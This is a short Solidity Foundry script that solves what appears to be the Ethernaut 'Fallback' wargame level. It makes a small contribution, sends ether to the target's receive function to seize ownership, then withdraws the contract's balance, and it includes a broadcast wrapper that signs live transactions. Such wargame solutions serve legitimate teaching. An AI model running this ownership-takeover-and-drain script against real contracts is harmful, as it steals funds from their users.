// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.19;

import {console, Script} from "forge-std/Script.sol";

contract FallbackAttk is Script {
    function attack(address payable fallbackCtr) public payable {
        // contribute to have contributions[msg.sender] > 0
        IFallback(fallbackCtr).contribute{value: 0.00001 ether}();
        // call fallback function
        fallbackCtr.call{value: 0.00001 ether}("");
        // withdraw
        IFallback(fallbackCtr).withdraw();
    }

    function broadcastedAttack(address payable fallbackCtr) external payable {
        // start broadcst to sign the transactions as the msg.sender(our address)
        vm.startBroadcast();
        attack(fallbackCtr);
        vm.stopBroadcast();
    }
}

interface IFallback {
    function contribute() external payable;

    function getContribution() external view returns (uint);

    function withdraw() external;

    function owner() external view returns (address);

    // ! function that need to be broken
    //   receive() external payable {
    //   require(msg.value > 0 && contributions[msg.sender] > 0);
    //   owner = msg.sender;
    // }
}
